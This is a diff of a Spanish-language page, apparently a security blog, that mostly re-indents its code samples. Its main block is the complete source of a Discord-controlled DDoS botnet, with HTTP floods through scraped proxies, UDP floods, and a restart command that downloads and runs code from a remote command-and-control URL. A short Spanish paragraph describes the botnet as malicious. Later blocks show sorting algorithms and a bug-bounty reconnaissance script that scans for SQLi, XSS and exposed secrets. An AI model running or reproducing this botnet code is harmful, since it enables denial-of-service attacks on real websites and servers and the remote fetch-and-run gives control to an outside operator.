+        embed.add_field(name="`customhttp` **Private**", value=f"Custom HTTP Flood.\n**𝚄𝚂𝙰𝙶𝙴:**\n`$customhttp <threads> <times> <semaphore> <bypasscheck (0 for no bypass 1 for bypass)> <servers/concurrents> <website>`", inline=True)
+        embed.add_field(name="`http` **Free**", value=f"Strong HTTP Flood.\n**𝚄𝚂𝙰𝙶𝙴:**\n`$http <servers/concurrents (maximum of 50)> <website>`", inline=True)
+        embed.add_field(name="`customudp` **Private**", value=f"Custom UDP Flood.\n**𝚄𝚂𝙰𝙶𝙴:**\n`$customudp <ip:port> <Packet Strength (maximum 147)> <threads> <Packets Per Thread> <servers/concurrents>`", inline=True)
+        embed.add_field(name="`udp` **Free**", value=f"Strong UDP Flood.\n**𝚄𝚂𝙰𝙶𝙴:**\n`$udp <servers/concurrents (maximum of 50)> <ip:port>`", inline=True)
+        embed.add_field(name=f"```{stre}```", value=f"**customhttp**\n`Up to 1.5k/server.`\n**http**\n`Up to 2k+/server.`\n**customudp**\n`Up to 7.5 Gbit/s / 15 servers.`\n**udp**\n`Same As Customudp.`", inline=False)
+        embed.set_footer(text="METHODS | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
+        await ctx.reply(embed=embed)
+
+canuseproxies = []
+
+art = """
+_____   ______  _____  _     _ _____ _______ _______
+|_____] |_____/ |     |  \___/    |   |______ |______
+|       |    \_ |_____| _/   \_ __|__ |______ ______|
+
+"""
+
+@bot.command()
+async def load(ctx, check, maxtime):
+    global finals
+    if int(server) == 1:
+        if check == "http":
+            embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Scraping` 0/4:white_check_mark:", colour=discord.Colour.green())
+            msg = await ctx.reply(embed=embed)
+            prox = proxygen.scraper()
+            embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Checking` 1/4:white_check_mark:", colour=discord.Colour.green())
+            await msg.edit(embed=embed)
+            canuseproxies = await proxygen.check(prox, int(maxtime))
+            embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Checking Dupes` 2/4:white_check_mark:", colour=discord.Colour.green())
+            await msg.edit(embed=embed)
+            start = len(canuseproxies)
+            finals = proxygen.checkdupes(canuseproxies)
+            end = len(finals)
+            embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Overwritting` 3/4:white_check_mark:", colour=discord.Colour.green())
+            await msg.edit(embed=embed)
+            time.sleep(0.2)
+            embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Done!` 4/4:white_check_mark:\nScraped `{len(finals)}` Proxies.\n`{maxtime}s` Proxy Cooldown.\n `{start - end}` Dupes Erased.", colour=discord.Colour.green())
+            await msg.edit(embed=embed)
+    else:
+        if check == "http":
+            prox = proxygen.scraper()
+            canuseproxies = await proxygen.check(prox, int(maxtime))
+            finals = proxygen.checkdupes(canuseproxies)
+
+@bot.command()
+async def unload(ctx, check):
+    global finals
+    if int(server) == 1:
+        if check == "http":
+            beforeunload = finals
+            finals = []
+            embed = discord.Embed(title="Unloaded Proxies", description=f"`{len(beforeunload)}` Proxies Were Unloaded.", colour=discord.Colour.green())
+            beforeunload = None
+            await ctx.reply(embed=embed)
+    else:
+        if check == "http":
+            finals = []
+
+@bot.command()
+async def customhttp(ctx, threads, times, sema, bypasscheck, srvrs, http):
+    global finals
+    if int(srvrs) > int(server) or int(srvrs) == int(server):
+        if int(srvrs) == server:
+            if bypasscheck == "1":
+                embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
+                embed.add_field(name="Attack Info", value=f"Attack Type: `L7 ~ Custom`\nWebsite: `{http}`\nThreads: `{threads}`\nRequests Per Thread: `{times}`\nSemaphore: `{sema}`\nServers/Concurrents: `{srvrs}`\nBypass: `True`")
+                embed.set_footer(text="L7 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
+                await ctx.send(embed=embed)
+            else:
+                embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
+                embed.add_field(name="Attack Info", value=f"Attack Type: `L7 ~ Custom`\nWebsite: `{http}`\nThreads: `{threads}`\nRequests Per Thread: `{times}`\nSemaphore: `{sema}`\nServers/Concurrents: `{srvrs}`\nBypass: `False`")
+                embed.set_footer(text="L7 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
+                await ctx.send(embed=embed)
+        sem = asyncio.Semaphore(int(sema))
+
+        if bypasscheck == "1":
+            if finals != []:
+                async def siekyle(useragent, platform, proxy):
+                    async with aiohttp.ClientSession() as session:
+                        async with sem:
+                            for _ in range(int(times)):
                                 try:
-                                    os.system(f"pip install discord && pip install requests && pip install lxml && curl -sL [REDACTED_C2_URL] > main.py && python main.py -s {server}")
-                                    exit()
-                                except: exit()
+                                    await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform}, proxy=f"http://{proxy}")
+                                except: await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform})
+            else:
+                async def siekyle(useragent, platform, proxy):
+                    async with aiohttp.ClientSession() as session:
+                        async with sem:
+                            for _ in range(int(times)):
+                                await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform})
 
-                            @bot.command()
-                            async def crash(ctx):
-                                if int(server) == 1:
-                                    embed = discord.Embed(title=f"Crashed:closed_lock_with_key:", description=f"All Servers Were Crashed.", colour=discord.Colour.green())
-                                    await ctx.reply(embed=embed)
-                                exit()
+        elif bypasscheck == "0":
+            async def siekyle():
+                async with aiohttp.ClientSession() as session:
+                    async with sem:
+                        for _ in range(int(times)):
+                            await session.get(http)
 
-                            @bot.command()
-                            async def stop(ctx):
-                                global stopset
-                                stopset = True
-                                if int(server) == 1:
-                                    embed = discord.Embed(title="Attack stopped!", colour=discord.Colour.green())
-                                    await ctx.send(embed=embed)
+        else:
+            print(f"Invalid BypassCheck at Function Defining -> <{str(bypasscheck)}>: should be 0 or 1.")
+
+        tasks = []
+        if bypasscheck == "1":
+            base_user_agents = [
+    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
+]           
+            platforms = ["Windows", "Linux", "MacOS"]
+            def rand_ua():
+                return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
+            def rand_pl():
+                return random.choice(platforms)
+            def rand_pr():
+                if finals != []:
+                    return random.choice(finals)
+                else: return "kompletterino"
+            for i in range(int(threads)):
+                tasks.append(siekyle(rand_ua(), rand_pl(), rand_pr()))
+            await asyncio.gather(*tasks)
+
+        elif bypasscheck == "0":
+            for i in range(int(threads)):
+                tasks.append(siekyle())
+            await asyncio.gather(*tasks)
+        else:
+            print(f"Invalid BypassCheck at Thread Defining -> <{str(bypasscheck)}>: should be 0 or 1.")
+
+@bot.command()
+async def http(ctx, srvrs, http):
+    global finals
+    global stopset
+    if stopset:
+        stopset = False
+    if int(srvrs) > int(server) or int(srvrs) == int(server) and int(srvrs) < 50 or int(srvrs) == 50:
+        global finals
+        if int(srvrs) == server:
+            embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
+            embed.add_field(name="Attack Info", value=f"Attack Type: `L7 ~ Normal`\nWebsite: `{http}`\nServers/Concurrents: `{srvrs}`")
+            embed.set_footer(text="L7 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
+            await ctx.send(embed=embed)
+        sem = asyncio.Semaphore(2500)
+        if finals != []:
+            async def siekyle(http, useragent, platform, proxy):
+                async with aiohttp.ClientSession() as session:
+                    async with sem:
+                        for _ in range(200):
+                            while not stopset:
+                                await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform}, proxy=f"http://{proxy}")
+                                if stopset: break
+        else:
+            async def siekyle(http, useragent, platform, proxy):
+                async with aiohttp.ClientSession() as session:
+                    async with sem:
+                        for _ in range(200):
+                            while not stopset:
+                                await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform})
+                                if stopset: break
+
+        platforms = ["Windows", "Linux", "MacOS"]
+        base_user_agents = [
+    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
+]
+        tasks = []
+        def rand_ua():
+            return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
+        def rand_pl():
+            return random.choice(platforms)
+        def rand_pr():
+            if finals != []:
+                return random.choice(finals)
+            else: return "kompletterino"
+        for i in range(2000):
+            tasks.append(siekyle(http, rand_ua(), rand_pl(), rand_pr()))
+        await asyncio.gather(*tasks)
+
+@bot.command()
+async def customudp(ctx, tshit, atcks, pks, pks2, srvrs):
+    thost, tport = tshit.split(":")
+    if int(srvrs) > int(server) or int(srvrs) == int(server):
+        if int(srvrs) == server:
+            embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
+            embed.add_field(name="Attack Info", value=f"Attack Type: `L4 ~ Custom`\nTarget: `{thost}:{tport}`\nPacket Stength: `{atcks}`\nThreads: `{pks}`\nExtra Packets: `{pks2}`\nServers/Concurrents: `{srvrs}`")
+            embed.set_footer(text="L4 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
+            await ctx.send(embed=embed)
+        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        letterlist = ["@", "#", "-", ".", ",", "?", "S", ";", "\0", ">", "=", "/"]
+        def shit():
+            i1 = random.choice(letterlist)
+            i2 = random.choice(letterlist)
+            i3 = random.choice(letterlist)
+            i4 = random.choice(letterlist)
+            i5 = random.choice(letterlist) * 6
+            data = f"{i1}{i2}{i5}{i3}{i4}" * int(atcks)
+            data = data.encode('utf-8')
+            for _ in range(int(pks2)):
+                udp_socket.sendto(data, (str(thost), int(tport)))
+        for i in range(int(pks)):
+            threading.Thread(target=shit()).start()
+
+@bot.command()
+async def udp(ctx, srvrs, tshit):
+    thost, tport = tshit.split(":")
+    if int(srvrs) > int(server) or int(srvrs) == int(server) and int(srvrs) < 50 or int(srvrs) == 50:
+        if int(srvrs) > int(server) or int(srvrs) == int(server):
+            if int(srvrs) == server:
+                embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
+                embed.add_field(name="Attack Info", value=f"Attack Type: `L4 ~ Normal`\nTarget: `{thost}:{tport}\n`Servers/Concurrents: `{srvrs}`")
+                embed.set_footer(text="L4 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
+                await ctx.send(embed=embed)
+            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+            letterlist = ["@", "#", "-", ".", ",", "?", "S", ";", "\0", ">", "=", "/"]
+            def shit():
+                i1 = random.choice(letterlist)
+                i2 = random.choice(letterlist)
+                i3 = random.choice(letterlist)
+                i4 = random.choice(letterlist)
+                i5 = random.choice(letterlist) * 6
+                data = f"{i1}{i2}{i5}{i3}{i4}" * 147
+                data = data.encode('utf-8')
+                for _ in range(1550):
+                    udp_socket.sendto(data, (str(thost), int(tport)))
+            for i in range(1000):
+                threading.Thread(target=shit()).start()
+
+@bot.command()
+async def restart(ctx):
+    if int(server) == 1:
+        embed = discord.Embed(title="RESTART:closed_lock_with_key:", description="All servers are getting Restarted.", colour=discord.Colour.green())
+        await ctx.reply(embed=embed)
+    try:
+        os.system(f"pip install discord && pip install requests && pip install lxml && curl -sL [REDACTED_C2_URL] > main.py && python main.py -s {server}")
+        exit()
+    except: exit()
+
+@bot.command()
+async def crash(ctx):
+    if int(server) == 1:
+        embed = discord.Embed(title=f"Crashed:closed_lock_with_key:", description=f"All Servers Were Crashed.", colour=discord.Colour.green())
+        await ctx.reply(embed=embed)
+    exit()
+
+@bot.command()
+async def stop(ctx):
+    global stopset
+    stopset = True
+    if int(server) == 1:
+        embed = discord.Embed(title="Attack stopped!", colour=discord.Colour.green())
+        await ctx.send(embed=embed)
 
 
-                            bot.run("[REDACTED_DISCORD_BOT_TOKEN]")
-                        </code></pre>
+bot.run("[REDACTED_DISCORD_BOT_TOKEN]")
+                            </code></pre>
+                        </div>
                     </div> 
+
                     <p>
                         Este script es un bot de Discord malicioso diseñado para funcionar como una botnet, es decir, un conjunto de sistemas controlados de forma remota para lanzar ataques de denegación de servicio (DDoS). Utiliza comandos de chat para que los atacantes puedan inundar sitios web o direcciones IP con tráfico masivo, ya sea a nivel de aplicación web (Capa 7 con peticiones HTTP) o a nivel de red (Capa 4 con paquetes UDP), buscando saturar los recursos del objetivo.
                     </p>
@@ -496,7 +504,7 @@
                         Técnicamente, el código aprovecha librerías como <em>discord.py</em> para escuchar órdenes y <em>aiohttp</em> junto a <em>socket</em> para generar el tráfico concurrente. Además, incluye un módulo automatizado que extrae y verifica listas de proxies públicos en tiempo real desde repositorios externos para ocultar el origen de los ataques, junto con una función de autorreinicio <em>(restart)</em> que le permite descargar e instalar actualizaciones de código desde un servidor remoto de comando y control (C2).
                     </p>
                 </div>
-            </article>            
+            </article>       
 
             <!-- Entrada 1 -->
             <!-- Entrada: Algoritmos de ordenación en Python -->
@@ -518,14 +526,14 @@
                     
                     <div class="code-scroll-box">
                         <pre class="code-block"><code>
-                            def quick_sort(arr):
-                            if len(arr) <= 1:
-                                return arr
-                            pivot = arr[len(arr) // 2]
-                            left = [x for x in arr if x < pivot]
-                            middle = [x for x in arr if x == pivot]
-                            right = [x for x in arr if x > pivot]
-                            return quick_sort(left) + middle + quick_sort(right)
+def quick_sort(arr):
+if len(arr) <= 1:
+    return arr
+pivot = arr[len(arr) // 2]
+left = [x for x in arr if x < pivot]
+middle = [x for x in arr if x == pivot]
+right = [x for x in arr if x > pivot]
+return quick_sort(left) + middle + quick_sort(right)
                         </code></pre>
                     </div>
 
@@ -536,15 +544,15 @@
 
                     <div class="code-scroll-box">
                         <pre class="code-block"><code>
-                            def gnome_sort(arr):
-                            index = 0
-                            while index < len(arr):
-                                if index == 0 or arr[index] >= arr[index - 1]:
-                                    index += 1
-                                else:
-                                    arr[index], arr[index - 1] = arr[index - 1], arr[index]
-                                    index -= 1
-                            return arr
+def gnome_sort(arr):
+index = 0
+while index < len(arr):
+    if index == 0 or arr[index] >= arr[index - 1]:
+        index += 1
+    else:
+        arr[index], arr[index - 1] = arr[index - 1], arr[index]
+        index -= 1
+return arr
                         </code></pre>
                     </div>
                     <p><strong>3. El algoritmo del caos: Bogo Sort ($O((n+1)!)$)</strong></p>
@@ -554,15 +562,15 @@
 
                     <div class="code-scroll-box">
                         <pre class="code-block"><code>
-                        import random
+import random
 
-                        def is_sorted(arr):
-                            return all(arr[i] <= arr[i + 1] for i in range(len(arr) - 1))
+def is_sorted(arr):
+    return all(arr[i] <= arr[i + 1] for i in range(len(arr) - 1))
 
-                        def bogo_sort(arr):
-                            while not is_sorted(arr):
-                                random.shuffle(arr)
-                            return arr
+def bogo_sort(arr):
+    while not is_sorted(arr):
+        random.shuffle(arr)
+    return arr
                         </code></pre>
                     </div>
 
@@ -612,119 +620,119 @@
 
                     <div class="code-scroll-box">
                         <pre class="code-block"><code>
-                        #!/bin/bash
+#!/bin/bash
 
-                        # Creamos un nombre de carpeta único con fecha y hora
-                        SESSION_DIR="recon_$(date +%Y%m%d_%H%M)"
-                        mkdir -p "$SESSION_DIR"
+# Creamos un nombre de carpeta único con fecha y hora
+SESSION_DIR="recon_$(date +%Y%m%d_%H%M)"
+mkdir -p "$SESSION_DIR"
 
-                        # Movemos la ejecución a esa carpeta para que todo lo que generen
-                        # las herramientas (subfinder, katana, etc.) caiga dentro automáticamente
-                        cd "$SESSION_DIR" || exit
+# Movemos la ejecución a esa carpeta para que todo lo que generen
+# las herramientas (subfinder, katana, etc.) caiga dentro automáticamente
+cd "$SESSION_DIR" || exit
 
-                        # Definimos el nombre del log
-                        LOG_FILE="recon_log_$(date +%Y%m%d_%H%M).log"
+# Definimos el nombre del log
+LOG_FILE="recon_log_$(date +%Y%m%d_%H%M).log"
 
-                        # Redirigimos toda la salida (pantalla y errores) al archivo y a la terminal
-                        exec > >(tee -a "$LOG_FILE") 2>&1
+# Redirigimos toda la salida (pantalla y errores) al archivo y a la terminal
+exec > >(tee -a "$LOG_FILE") 2>&1
 
-                        # Asegurar que el PATH de Go y binarios locales esté activo
-                        export PATH=$PATH:$(go env GOPATH)/bin
-                        export PATH=$PATH:/usr/local/bin
+# Asegurar que el PATH de Go y binarios locales esté activo
+export PATH=$PATH:$(go env GOPATH)/bin
+export PATH=$PATH:/usr/local/bin
 
-                        # Especificar Header / User-Agent personalizado
-                        MY_UA="User-Agent: BugBounty-Research (contact: tu_email@proton.me)"
+# Especificar Header / User-Agent personalizado
+MY_UA="User-Agent: BugBounty-Research (contact: tu_email@proton.me)"
 
-                        echo -e "\e[1;34m[*] ==========================================\e[0m"
-                        echo -e "\e[1;34m[*] INICIANDO RECON AUTOMATIZADO              \e[0m"
-                        echo -e "\e[1;34m[*] ==========================================\e[0m"
+echo -e "\e[1;34m[*] ==========================================\e[0m"
+echo -e "\e[1;34m[*] INICIANDO RECON AUTOMATIZADO              \e[0m"
+echo -e "\e[1;34m[*] ==========================================\e[0m"
 
-                        # Fase 1: Enumeración de Subdominios Pasivos
-                        echo -e "\n\e[1;33m[*] Fase 1: Recopilando subdominios pasivos con Subfinder...\e[0m"
-                        subfinder -dL ../scope.txt -o subf_subdomains.txt
+# Fase 1: Enumeración de Subdominios Pasivos
+echo -e "\n\e[1;33m[*] Fase 1: Recopilando subdominios pasivos con Subfinder...\e[0m"
+subfinder -dL ../scope.txt -o subf_subdomains.txt
 
-                        # Fase 2: Fuerza Bruta de Subdominios
-                        echo -e "\n\e[1;33m[*] Fase 2: Realizando fuerza bruta de subdominios con Puredns... \e[0m"
-                        puredns bruteforce /ruta/a/diccionarios/subdomains.txt ../scope.txt -r ../resolvers.txt > puredns_subdomains.txt
+# Fase 2: Fuerza Bruta de Subdominios
+echo -e "\n\e[1;33m[*] Fase 2: Realizando fuerza bruta de subdominios con Puredns... \e[0m"
+puredns bruteforce /ruta/a/diccionarios/subdomains.txt ../scope.txt -r ../resolvers.txt > puredns_subdomains.txt
 
-                        echo -e "\n\e[1;33m[*] Mezclando y unificando subdominios...\e[0m"
-                        cat subf_subdomains.txt puredns_subdomains.txt | sort -u > all_potential_subdomains.txt
-                        echo -e "\e[1;32m[✓] Total de subdominios únicos encontrados: $(wc -l < all_potential_subdomains.txt)\e[0m"
+echo -e "\n\e[1;33m[*] Mezclando y unificando subdominios...\e[0m"
+cat subf_subdomains.txt puredns_subdomains.txt | sort -u > all_potential_subdomains.txt
+echo -e "\e[1;32m[✓] Total de subdominios únicos encontrados: $(wc -l < all_potential_subdomains.txt)\e[0m"
 
-                        # Fase 3: Descubrimiento mediante certificados TLS
-                        echo -e "\n\e[1;33m[*] Buscando nombres en certificados TLS con TLSX...\e[0m"
-                        cat all_potential_subdomains.txt | tlsx -san -silent | anew all_potential_subdomains.txt
+# Fase 3: Descubrimiento mediante certificados TLS
+echo -e "\n\e[1;33m[*] Buscando nombres en certificados TLS con TLSX...\e[0m"
+cat all_potential_subdomains.txt | tlsx -san -silent | anew all_potential_subdomains.txt
 
-                        # Fase 4: Filtrado de hosts vivos (Probing)
-                        echo -e "\n\e[1;33m[*] Fase 4: Validando subdominios activos con Httpx...\e[0m"
-                        cat all_potential_subdomains.txt | httpx -silent -H "$MY_UA" -o alive_subdomains.txt
-                        echo -e "\e[1;32m[✓] Total de subdominios vivos respondiendo HTTP/HTTPS: $(wc -l < alive_subdomains.txt)\e[0m"
+# Fase 4: Filtrado de hosts vivos (Probing)
+echo -e "\n\e[1;33m[*] Fase 4: Validando subdominios activos con Httpx...\e[0m"
+cat all_potential_subdomains.txt | httpx -silent -H "$MY_UA" -o alive_subdomains.txt
+echo -e "\e[1;32m[✓] Total de subdominios vivos respondiendo HTTP/HTTPS: $(wc -l < alive_subdomains.txt)\e[0m"
 
-                        # Capturas visuales opcionales con Aquatone
-                        echo -e "\n\e[1;33m[*] ¿Quieres llevar a cabo capturas de pantalla con Aquatone? (y/n) [n en 5 min]\e[0m"
-                        read -t 300 -r respuesta
+# Capturas visuales opcionales con Aquatone
+echo -e "\n\e[1;33m[*] ¿Quieres llevar a cabo capturas de pantalla con Aquatone? (y/n) [n en 5 min]\e[0m"
+read -t 300 -r respuesta
 
-                        if [[ "$respuesta" == "y" || "$respuesta" == "Y" ]]; then
-                            mkdir -p aquatone_results
-                            cat alive_subdomains.txt | aquatone -out aquatone_results -threads 4 -screenshot-timeout 10000 -http-timeout 3000
-                            echo -e "\e[1;32m[+]\e[0m Capturas completadas. Reporte HTML en: aquatone_results/aquatone_report.html"
-                        else
-                            echo -e "[*] Saltando Aquatone por decisión del usuario."
-                        fi
+if [[ "$respuesta" == "y" || "$respuesta" == "Y" ]]; then
+    mkdir -p aquatone_results
+    cat alive_subdomains.txt | aquatone -out aquatone_results -threads 4 -screenshot-timeout 10000 -http-timeout 3000
+    echo -e "\e[1;32m[+]\e[0m Capturas completadas. Reporte HTML en: aquatone_results/aquatone_report.html"
+else
+    echo -e "[*] Saltando Aquatone por decisión del usuario."
+fi
 
-                        # Fase 5: Crawling + Extracción de URLs (Pasivo y Activo)
-                        echo -e "\n\e[1;33m[*] Extrayendo URLs pasivas con Gau...\e[0m"
-                        cat alive_subdomains.txt | gau --threads 20 > urls_pasivas.txt
+# Fase 5: Crawling + Extracción de URLs (Pasivo y Activo)
+echo -e "\n\e[1;33m[*] Extrayendo URLs pasivas con Gau...\e[0m"
+cat alive_subdomains.txt | gau --threads 20 > urls_pasivas.txt
 
-                        echo -e "\n\e[1;33m[*] Mapeando la web activamente con Katana...\e[0m"
-                        katana -list alive_subdomains.txt -d 3 -jc -kf all -c 20 -H "$MY_UA" -silent -o urls_activas.txt
+echo -e "\n\e[1;33m[*] Mapeando la web activamente con Katana...\e[0m"
+katana -list alive_subdomains.txt -d 3 -jc -kf all -c 20 -H "$MY_UA" -silent -o urls_activas.txt
 
-                        echo -e "\n\e[1;33m[*] Unificando mapa completo de URLs...\e[0m"
-                        cat urls_pasivas.txt urls_activas.txt | sort -u > all_urls.txt
-                        cat all_urls.txt | unfurl keys | sort -u > lista_parametros.txt
-                        echo -e "\e[1;32m[✓] Total de URLs únicas para analizar: $(wc -l < all_urls.txt)\e[0m"
+echo -e "\n\e[1;33m[*] Unificando mapa completo de URLs...\e[0m"
+cat urls_pasivas.txt urls_activas.txt | sort -u > all_urls.txt
+cat all_urls.txt | unfurl keys | sort -u > lista_parametros.txt
+echo -e "\e[1;32m[✓] Total de URLs únicas para analizar: $(wc -l < all_urls.txt)\e[0m"
 
-                        # Fase 6: Clasificación de Endpoints con GF
-                        echo -e "\n\e[1;33m[*] Fase 6: Clasificando endpoints sospechosos con GF...\e[0m"
-                        cat all_urls.txt | gf sqli > sqli_endpoints.txt
-                        cat all_urls.txt | gf redirect > open_redirects.txt
-                        cat all_urls.txt | gf xss > xss_endpoints.txt
-                        cat all_urls.txt | gf idor > idor_endpoints.txt
+# Fase 6: Clasificación de Endpoints con GF
+echo -e "\n\e[1;33m[*] Fase 6: Clasificando endpoints sospechosos con GF...\e[0m"
+cat all_urls.txt | gf sqli > sqli_endpoints.txt
+cat all_urls.txt | gf redirect > open_redirects.txt
+cat all_urls.txt | gf xss > xss_endpoints.txt
+cat all_urls.txt | gf idor > idor_endpoints.txt
 
-                        echo -e "\e[1;32m[✓] Endpoints clasificados -> XSS: $(wc -l < xss_endpoints.txt) | SQLi: $(wc -l < sqli_endpoints.txt) | OpenRedirect: $(wc -l < open_redirects.txt) | IDOR: $(wc -l < idor_endpoints.txt)\e[0m"
+echo -e "\e[1;32m[✓] Endpoints clasificados -> XSS: $(wc -l < xss_endpoints.txt) | SQLi: $(wc -l < sqli_endpoints.txt) | OpenRedirect: $(wc -l < open_redirects.txt) | IDOR: $(wc -l < idor_endpoints.txt)\e[0m"
 
-                        # Filtrado de parámetros vulnerables
-                        grep -iE "id=|cat=|product=|search=|type=" lista_parametros.txt > posibles_sqli.txt
-                        grep -iE "q=|query=|keyword=|name=|email=" lista_parametros.txt > posibles_xss.txt
+# Filtrado de parámetros vulnerables
+grep -iE "id=|cat=|product=|search=|type=" lista_parametros.txt > posibles_sqli.txt
+grep -iE "q=|query=|keyword=|name=|email=" lista_parametros.txt > posibles_xss.txt
 
-                        # Fase 7: Análisis de JavaScript (Caza de Secretos)
-                        echo -e "\n\e[1;33m[*] Fase 7: Aislando y analizando archivos JavaScript...\e[0m"
-                        cat all_urls.txt | grep -E "\.js(\?|$)" > js_endpoints.txt
+# Fase 7: Análisis de JavaScript (Caza de Secretos)
+echo -e "\n\e[1;33m[*] Fase 7: Aislando y analizando archivos JavaScript...\e[0m"
+cat all_urls.txt | grep -E "\.js(\?|$)" > js_endpoints.txt
 
-                        if [ -s js_endpoints.txt ]; then
-                            echo -e "[*] Ejecutando jsexposures..."
-                            python3 /ruta/a/jsexposures/jsexposures.py --file js_endpoints.txt --max-workers 15 --log-level INFO --mode balanced
-                            
-                            echo -e "[*] Ejecutando Trufflehog sobre la lista de JS..."
-                            trufflehog filesystem --directory=./js_endpoints.txt --only-verified
-                        else
-                            echo -e "\e[1;31m[X] No se encontraron archivos JS para escanear.\e[0m"
-                        fi
+if [ -s js_endpoints.txt ]; then
+    echo -e "[*] Ejecutando jsexposures..."
+    python3 /ruta/a/jsexposures/jsexposures.py --file js_endpoints.txt --max-workers 15 --log-level INFO --mode balanced
+    
+    echo -e "[*] Ejecutando Trufflehog sobre la lista de JS..."
+    trufflehog filesystem --directory=./js_endpoints.txt --only-verified
+else
+    echo -e "\e[1;31m[X] No se encontraron archivos JS para escanear.\e[0m"
+fi
 
-                        # Fase 8: Escaneo de Vulnerabilidades con Nuclei
-                        echo -e "\n\e[1;33m[*] ¿Quieres lanzar el escaneo pesado con Nuclei? (y/n) [n en 5 min]\e[0m"
-                        read -t 300 -r respuesta
+# Fase 8: Escaneo de Vulnerabilidades con Nuclei
+echo -e "\n\e[1;33m[*] ¿Quieres lanzar el escaneo pesado con Nuclei? (y/n) [n en 5 min]\e[0m"
+read -t 300 -r respuesta
 
-                        if [[ "$respuesta" == "y" || "$respuesta" == "Y" ]]; then
-                            echo -e "\n\e[1;33m[*] Lanzando escáner de vulnerabilidades Nuclei (Safe rate-limit)...\e[0m"
-                            nuclei -l all_urls.txt -H "$MY_UA" --rate-limit 10 -o nuclei_results.txt
-                        else
-                            echo -e "[*] Saltando fase de Nuclei por decisión del usuario."
-                        fi
+if [[ "$respuesta" == "y" || "$respuesta" == "Y" ]]; then
+    echo -e "\n\e[1;33m[*] Lanzando escáner de vulnerabilidades Nuclei (Safe rate-limit)...\e[0m"
+    nuclei -l all_urls.txt -H "$MY_UA" --rate-limit 10 -o nuclei_results.txt
+else
+    echo -e "[*] Saltando fase de Nuclei por decisión del usuario."
+fi
 
-                        echo -e "\n\e[1;32m[*] ==========================================\e[0m"
-                        echo -e "\e[1;32m[*] ¡RECON COMPLETO! Revisa los archivos .txt \e[0m"
-                        echo -e "\e[1;32m[*] ==========================================\e[0m"
+echo -e "\n\e[1;32m[*] ==========================================\e[0m"
+echo -e "\e[1;32m[*] ¡RECON COMPLETO! Revisa los archivos .txt \e[0m"
+echo -e "\e[1;32m[*] ==========================================\e[0m"
                         </code></pre>
                     </div>
 
